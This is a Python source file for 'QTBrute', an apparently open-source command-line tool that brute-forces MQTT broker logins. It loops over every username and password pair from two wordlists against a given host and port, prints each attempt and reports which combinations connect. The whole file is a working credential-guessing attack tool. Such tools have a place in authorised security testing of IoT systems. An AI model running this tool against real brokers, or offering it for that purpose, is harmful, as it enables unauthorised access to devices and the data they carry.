#
#  Copyright (c) 2020 Zevedei Ionut
#
#  Permission is hereby granted, free of charge, to any person obtaining a copy
#  of this software and associated documentation files (the "Software"), to deal
#  in the Software without restriction, including without limitation the rights
#  to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
#  copies of the Software, and to permit persons to whom the Software is
#  furnished to do so, subject to the following conditions:
#
#  The above copyright notice and this permission notice shall be included in all
#  copies or substantial portions of the Software.
#
#  THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
#  IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
#  FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
#  AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
#  LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
#  OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
#  SOFTWARE.

import argparse
import paho.mqtt.client as mqtt
import time

client = None
protocol = 'mqtt'
host = ''
port = 1884
usernames_file_path = None
passwords_file_path = None
successful = False
successful_count = 0
timeout = 1
tries = 0

def on_connect_handler(client, userdata, flags, code):
  global successful, successful_count

  if (code == 0):
    successful_count += 1
    successful = True


def brute():
  global client,\
         tries,\
         successful,\
         timeout,\
         port,\
         host,\
         usernames_file_path,\
         passwords_file_path

  try:

    client = mqtt.Client()
    client.on_connect = on_connect_handler

    if (usernames_file_path != '' and passwords_file_path != ''):
      usernames_count = sum(1 for line in open(usernames_file_path))
      passwords_count = sum(1 for line in open(passwords_file_path))

      print(
        f'[qtbrute]: will try %d usernames with %d passwords (%d total attempts)' %
        (usernames_count, passwords_count, usernames_count * passwords_count)
      )

      with open(usernames_file_path) as usernames_file:
        usernames = usernames_file.read().splitlines()
        with open(passwords_file_path) as passwords_file:
          passwords = passwords_file.read().splitlines()
          for username in usernames:
            for password in passwords:
              stripped_username = username.rstrip()
              stripped_pwd = password.rstrip()

              tries += 1
              print(f'[qtbrute]: attempt %d -> %s : %s' % (tries, stripped_username, stripped_pwd))

              client.username_pw_set(stripped_username, stripped_pwd)
              client.connect(host, int(port))
              client.loop_start()
              if (timeout is not None):
                time.sleep(timeout)
              client.loop_stop()
              client.disconnect()

              if (successful):
                print(f'\t[success]: combination %s : %s works!' % (stripped_username, stripped_pwd))
                successful = False

      print(f'\n[result]: found %d working combinations out of %d attempted' % (successful_count, usernames_count * passwords_count))

  except Exception as e:
    print(f'[exception]: %s' % e)

def main():
  global protocol, host, port, username, usernames_file_path, password, passwords_file_path, stop_on_first, timeout

  arg_parser = argparse.ArgumentParser(description='QTBrute - MQTT bruteforce tool')
  arg_parser.add_argument('host', help = 'host IP / name')
  arg_parser.add_argument('port', help = 'port')
  arg_parser.add_argument('-uf', help = 'usernames file')
  arg_parser.add_argument('-pf', help = 'passwords file')
  arg_parser.add_argument('-t', help = 'timeout between retries (default - 1 s)')

  args = arg_parser.parse_args()

  host = args.host
  port = args.port
  usernames_file_path = args.uf
  passwords_file_path = args.pf
  timeout = args.t

  brute()

if __name__ == '__main__':
  main()
